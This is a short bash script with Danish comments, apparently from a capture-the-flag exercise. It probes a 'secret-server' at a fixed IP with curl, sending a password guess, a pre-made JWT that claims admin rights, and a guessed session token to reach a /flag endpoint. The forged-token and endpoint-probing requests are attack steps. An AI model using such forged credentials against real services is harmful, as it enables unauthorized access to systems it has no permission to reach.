#!/bin/bash
SS="77.74.147.54"
HOST="Host: secret-server.hkn"
JWT2="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoxMzAwMDAwMDAwfQ.d-H00PqEmUozSDiQxSRWBYeyIqvuaTifVVBHlKaE2Wc"

echo "### STEP 1: POST /keycheck key=my-password paa secret-server (.54) ###"
curl -s --connect-timeout 3 --max-time 5 -D /tmp/step1_headers.txt -X POST "http://$SS/keycheck" \
    -H "$HOST" -H "Content-Type: text/plain" --data-raw "key=my-password"
echo ""
echo "--- Response headers (step 1) ---"
cat /tmp/step1_headers.txt
echo "---"

echo ""
echo "### STEP 2: GET /next_chars?char=s med JWT2 (den kendte virkende) paa .54 ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$SS/next_chars?char=s" \
    -H "$HOST" -H "JWT: $JWT2"
echo ""
echo "---"

echo ""
echo "### STEP 3: GET /flag med Session-Token: very-good-session-token paa .54 (ved vi giver joke-flag) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$SS/flag" \
    -H "$HOST" -H "Session-Token: very-good-session-token"
echo ""
echo "---"

echo ""
echo "### STEP 4: GET /next_chars UDEN char param paa .54 (bekraefter fejlbesked) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$SS/next_chars" -H "$HOST"
echo ""
echo "---"

echo ""
echo "### STEP 5: GET / paa .54 (se formular/besked der) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$SS/" -H "$HOST"
echo ""
